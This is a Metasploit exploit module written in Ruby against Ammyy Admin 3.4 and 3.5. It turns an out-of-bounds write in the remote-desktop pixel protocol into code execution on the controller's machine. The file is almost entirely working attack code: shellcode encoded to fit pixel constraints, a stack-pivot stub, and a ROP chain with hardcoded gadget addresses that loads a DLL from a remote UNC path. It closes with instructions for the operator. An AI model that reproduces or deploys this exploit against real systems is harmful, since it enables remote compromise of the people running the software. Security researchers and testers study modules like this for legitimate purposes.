##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
require 'rexml/document'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ammyy Admin Array Index Out-Of-Bounds',
      'Description'    => %q{
        This exploit gains code execution on the controller side of Ammyy Admin from the controlled
        side. To do this, it exploits an array index out-of-bounds write. The exploit uses the
        relative OOB write to overwrite a return address on the thread stack, which is generally
        mapped directly below the Ammyy image data, and retrying on the next thread stack in case
        that was not the correct thread.
 
        There are two targets, one for immediate, direct shellcode execution taking advantage of
        the fact that Ammyy does not opt-in to DEP, and the second, using a ROP-only exploit to
        call LoadLibraryW with a remote UNC path.
 
        Since Ammyy Admin uses a crypto library that would be very time-consuming to reproduce and
        multiple methods of setting up a connection (relay, direct, etc.) this exploit was written
        to simply hook Ammyy Admin from an injected DLL, using its own code to handle the crypto and
        connections, substituting the exploit for any data sent to the server. This module will
        generate a file (exploit.dat) you must copy, along with aaexploit.exe, to a Windows VM. Run
        aaexploit.exe, and wait for a connection. When you hit "accept" on the connection, the
        exploit will be sent.
 
        This module has been tested successfully against Ammyy Admin 3.4 on Windows Vista 32-bit
        and Windows 7 32 and 64-bit for direct (IP) connections only.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Matt "scriptjunkie" Weeks <scriptjunkie[at]scriptjunkie.us>'
        ],
      'References'     =>
        [
          [ 'CVE', '2014-XXXX' ],
          [ 'OSVDB', 'XXXX' ],
        ],
      'Payload'        =>
        {
          'Space'          => 800,
          'DisableNops'    => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Ammyy Admin 3.4 Direct',
            {
              'Type'    => 'direct',
              'Version' => '3.4'
            }
          ],
          [ 'Ammyy Admin 3.4 Always-On DEP',
            {
              'Type'    => 'rop',
              'Version' => '3.4'
            }
          ],
          [ 'Ammyy Admin 3.5 Direct',
            {
              'Type'    => 'direct',
              'Version' => '3.5'
            }
          ],
          [ 'Ammyy Admin 3.5 Always-On DEP',
            {
              'Type'    => 'rop',
              'Version' => '3.5'
            }
          ]
        ],
      'Privileged'     => true,
      'DisclosureDate' => '',
      'DefaultTarget'  => 0))
 
    register_options(
      [
        OptString.new('DLL_PATH', [ false, 'The DLL path to load for the DEP Always-On target.',
            '\\\\1.2.3.4\\file.dll']),
        OptString.new('FILENAME', [ true, 'The file name.',  'exploit.dat']),
      ], self.class)
  end
 
  # Takes a string of binary data, and generates a stroke set in the Ammyy protocol which will
  # write that data to the specified col/row point on the remote side, skipping a given pixel if
  # specified to avoid overwriting a particular local variable at the wrong time
  def strokeSet(col, row, data, skip)
    #minus one because the number of strokes is the number of pixels - 1
    numpixels = (data.length + 3) / 4
    numpixels -= 1 if skip != -1 # subtract again if you have a skip
 
    #03 XoffsetWord YoffsetWord DrawWidthWord DrawHeightWord
    output = "\x03" + [col, row, numpixels, 1].pack('vvvv')
    output << "XXXX" # end of packet signal to injector
 
    offset = -1
    #zero pad to 4 byte boundary; any extra is discarded in unpack("V*")
    (data + "\x00\x00\x00").unpack('V*').each do |pixel|
        offset += 1
        next if skip == offset # don't write this pixel if we're avoiding overwriting a var
 
        # Get pixel values from this 4-byte chunk
        r, g, b, a = [pixel].pack("V").unpack("C*")
 
        # sanity check pixel value
        print_error("Shellcode at pixel #{offset} invalid; has trailing 0") if a != 0
 
        # We send pixels in 16 x 1 sections; each of which has its own header (0x1A)
        if offset % 0x10 == 0
            # Chunk header; includes flags (0x1A), background color we use to set 1st pixel values,
            # and number of strokes (pixels) remaining to send in this chunk
            numstrokes = [0xF, numpixels - offset - 1].min
            output << [0x1A, r, g, b, numstrokes].pack("C*")
        else
            # This is a stroke. A stroke can be multiple pixels wide or high, but we're just using
            # them to write a single pixel each. Data format looks like this:
 
            # R G B [low nibble Y offset, high nibble X offset]
            # [low nibble stroke height; high nibble stroke width]
 
            # since we're only using 1x1 strokes, we only set the X offset part of this
            output << [r, g, b, (offset % 0x10) << 4, 0].pack("C*")
        end
    end
    output << "XXXX"
    output
  end
 
  def exploit
    # Injected dll divides packets to send by "XXXX"
    # First we specify header data and global flags for the connection.
    sploit = "XXXX=XXXX"
    sploit << "\x7E\xCC\xF5\xED\xB7\x16\x92\xE2\x96\xBD\xF3\xFF\xC0\xFF\x2D\x97\x69\xF2\xCA\x99"
    sploit << "XXXX"
    sploit << "\x00\x7F\x00\x00\x00"
    sploit << "XXXX"
    # send bogus system info
    sploit << "\x3A\x00Windows\x006.0.6001 SP1.0\x00U_R_PWNED\x0AJan 01 2014 at 01:23:45\x00\x05"
    sploit << "XXXX"
    sploit << "\x15"
    sploit << "XXXX"
    # screen dimensions and stuff
    sploit << "\x70\x03\x03\x65\x18\x00\xff\x00\xff\x00\xff\x00\x10\x08\x00\x20\x00\xff\x00\xff\x00"
    sploit << "\xff\x00\x10\x08\x00\x20\x03\x58\x02"
    sploit << "XXXX"
 
    if target['Version'] == '3.4'
        offsets = {
            'push_esp_ret' => 0x004424a2,
            'pop_ebp_ret'  => 0x004488bf,
            'loadlibW'     => 0x0044C7B3,
            'pop_edi_ret'  => 0x0045aba9,
            'pop_esi_ret'  => 0x00460029,
            'pushad_ret'   => 0x0045ed48,
            'ret'          => 0x00430315
            }
    else
        offsets = {
            'push_esp_ret' => 0x004786cf,
            'pop_ebp_ret'  => 0x00418086,
            'loadlibW'     => 0x0044F079,
            'pop_edi_ret'  => 0x00471639,
            'pop_esi_ret'  => 0x0046003e,
            'pushad_ret'   => 0x004615e8,
            'ret'          => 0x004012C0
            }
    end
     
    if target['Type'] == 'direct'
        # shellcode must be in unicode format
        first_payload = payload.encoded
        encoder = framework.encoders.create("x86/unicode_mixed")
        encoder.datastore.import_options_from_hash( {'BufferRegister'=> 'ESP' })
        unicode_payload = encoder.encode(first_payload, nil, nil, platform)
        scode = unicode_payload.unpack("C*").pack("v*")
        # actually not, but every 4th byte must be a 0 since we can only write the R G B parts of
        # the pixel, and the pixels are stored as R G B A, which ends up being R G B 0, but we
        # don't have  a generic "every 4th byte must be null" encoder, so we just use the Unicode
        # one, which works just fine.
 
        # First stroke set will write the shellcode at the beginning of the screen buffer
        sploit << strokeSet(0, 599, scode, -1)
 
        # Second write will be an OOB write that will overwrite the return address
        # Then calculate address of shellcode and jump to the shellcode
        # This will work most of the time
        stack = [offsets['push_esp_ret'], # PUSH ESP # RETN  in AA_v3.exe
                 0x00000000].pack("V*")   # not used since ret 4; must be skipped due to local var
        stack << "\xB8\x3C\x01\x00\x00" + # mov eax, 0x13C
                 "\xEB\x01" +             # jmp next
                 "\x00" +                 # has to be null
                 "\x01\xC4" +             # next: add esp, eax
                 "\xEB\x00" +             # jmp over mandatory null
                 "\xFF\xE4"               # jmp esp
 
        # Return address is at 0325FEBC, when pixel data  starts at 03360000. That's a 0x144 or 324
        # byte OOB overwrite from start of image, which is 81 pixels. So, with an 800x600 screen,
        # we use a stroke set with X offset 719 and Y offset 600 (rows go down in address)
        sploit << strokeSet(719, 600, stack, 1)
 
        # Third write will be second trigger, and may work if that fails
        # it's pretty much the same thing except add another megabyte (default stack size) to esp
        stack = [offsets['push_esp_ret'],   # PUSH ESP # RETN  in AA_v3.exe
                 0x00000000].pack("V*")     # not used since ret 4; must be skipped due to local var
        stack << "\x81\xC4\x3C\x00\x01\x00" # add esp,0x1003c
                 "\xEB\x00"                 # jmp over mandatory null
                 "\xB8\x00\x01\x00\x00"     # mov eax,0x100
                 "\xEB\x01" +               # jmp next
                 "\x00" +                   # has to be null
                 "\x01\xC4" +               # next: add esp, eax
                 "\xEB\x00" +               # jmp over mandatory null
                 "\xFF\xE4"                 # jmp esp
 
        # executing stack is 0x100000 below since default stack size is 1MB (0x100000 bytes); e.g.
        # at 0347FEBC when image starts at 03580000. That's 0x40051 (or 262225) pixels back, which
        # is 327 rows and then 625 pixels. So our X offset is 175 (AF) and Y offset is 927
        sploit << strokeSet(175, 927, stack, 1)
 
    elsif target['Type'] == 'rop'
        # ROP target is all-in-one write that will overwrite the return address on the stack
        # and end up calling LoadLibraryW with a UNC path
        stack = [offsets['pop_ebp_ret'],    # POP EBP # RETN [AA_v3.exe]
                 0x00000000,                # not used since ret 4; must be skipped due to local var
                 offsets['loadlibW'],       # address of call LoadLibraryW
                 offsets['pop_edi_ret'],    # POP EDI # RETN [AA_v3.exe]
                 offsets['ret'],            # RETN
                 offsets['pop_esi_ret'],    # POP ESI # RETN
                 offsets['ret'],            # RETN
                 offsets['pushad_ret'],     # PUSHAD # RETN    jumps to edi, with esi, ebp, orig esp... above
                 ].pack("V*")
        stack << datastore['DLL_PATH'].unpack("C*").pack("v*")
 
        # same offset logic as above
        sploit << strokeSet(719, 600, stack, 1)
 
        # second try, same logic as above
        sploit << strokeSet(175, 927, stack, 1)
    end
 
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    print_status("Now copy that, along with aaexploit.exe, to a Windows VM.")
    print_status("Then run aaexploit.exe, and wait for a connection.")
    print_status("Hit accept on a connection request to send the exploit.")
 
    file_create(sploit)
  end
 
end
